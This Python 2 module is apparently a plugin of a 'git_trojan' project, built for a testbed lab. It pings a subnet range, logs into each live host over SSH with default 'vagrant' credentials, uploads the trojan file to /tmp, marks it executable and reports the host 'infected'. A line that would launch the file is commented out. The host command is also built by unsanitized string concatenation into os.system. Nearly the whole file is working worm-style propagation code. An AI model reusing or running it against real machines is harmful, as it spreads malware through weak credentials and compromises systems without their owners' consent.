#   This is altered file from ping.py
import os
import paramiko
import sys
fileName = "git_trojan"
def run(**args):
    myList = []
    # Function to ping and find all hosts on a network
    def pinger(hostname):
        response = os.system("ping -c 1 " + hostname)
        # and then check the response...
        if response == 0:
            pingstatus = 1
        else:
            pingstatus = 0
        return pingstatus

    hostname = "192.168.1."
    #   For DETER need to change to local address!!!!
    #   Change range to (255)
    for i in range(119,121,1):
        hostname = 'localhost'  # For testing
        res = pinger(hostname) #+ str(i))
        if res == 1:
            myList.append(hostname ) #+ str(i))
    for index,ipAddr in enumerate(myList):
        print "[+] Attacking Host : %s " %ipAddr
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ipAddr, username="vagrant", password="vagrant")
            sftpClient = ssh.open_sftp()
            sftpClient.put("../" + fileName, "/tmp/" + fileName)
            ssh.exec_command("chmod a+x /tmp/" + fileName)
            print "[*] " + ipAddr + " infected."
            #ssh.exec_command("nohup /tmp/" +fileName+ " &")
        except paramiko.AuthenticationException:
            print "[-] Failed! ..."

    return str(myList)
